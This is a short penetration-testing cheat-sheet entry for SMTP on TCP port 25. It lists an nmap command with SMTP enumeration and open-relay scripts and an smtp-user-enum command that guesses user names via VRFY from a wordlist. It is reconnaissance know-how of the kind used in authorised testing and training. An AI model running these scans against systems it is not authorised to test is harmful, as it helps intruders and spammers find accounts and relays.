SMTP — TCP 25
++++++++++++++++++++++++++++++++++++++++
nmap -p25 --script smtp-commands,smtp-enum-users,smtp-open-relay <ip_address>
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip_address>
